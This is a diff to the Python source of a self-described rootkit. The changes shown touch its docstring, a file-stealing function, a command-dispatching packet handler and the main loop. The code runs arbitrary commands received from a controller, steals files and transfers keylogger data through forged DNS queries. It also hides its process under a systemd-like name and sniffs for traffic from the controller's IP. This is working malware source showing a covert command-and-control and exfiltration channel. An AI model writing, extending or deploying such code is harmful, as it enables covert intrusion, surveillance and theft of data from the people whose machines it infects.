@@ -1,7 +1,7 @@
 """
     This is the rootkit program. It receives commands from the controller,
-    decrypts them, executes them, and then returns a response via a DNS
-    query.
+    decrypts them, executes them, and sends data to the controller through 
+    forged DNS queries.
 """
 
 # Ignore warnings
@@ -203,9 +203,6 @@ class FileSystemMonitor():
             return
 
 
-class DirectoryNotFound(Exception): pass
-
-
 def get_random_hostname():
     size = len(HOSTNAMES)
     index = randint(0, size-1)
@@ -360,6 +357,7 @@ def execute_steal_file(filepath) -> bool:
     # Notify the controller
     query = forge_dns_query_stream("SUCCESS: Sending file...", GENERAL_MSG_IDENTIFICATION)
     send_dns_query(query)
+    return True
 
 
 def packet_handler(pkt):
@@ -387,10 +385,6 @@ def packet_handler(pkt):
                 transfer_keylogger()
         if argv[0] == STEAL:
             execute_steal_file(argv[1])
-            pass
-            # print(f"Stealing: {argv[1]}")
-            # query = forge_dns_query_stream("Success: Stealing file now.", GENERAL_MSG_IDENTIFICATION)
-            # send_dns_query(query)
     if argv[0] == EXECUTE:
         result = execute_arbitrary_command(argv[1:])
         num_bytes = len(result.encode("utf-8"))
@@ -402,6 +396,7 @@ MONITOR = FileSystemMonitor()
 
 
 if __name__ == "__main__":
+    print("Rootkit is listening for commands...")
     hide_process_name("systemd-userwork-evil")
     sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
 
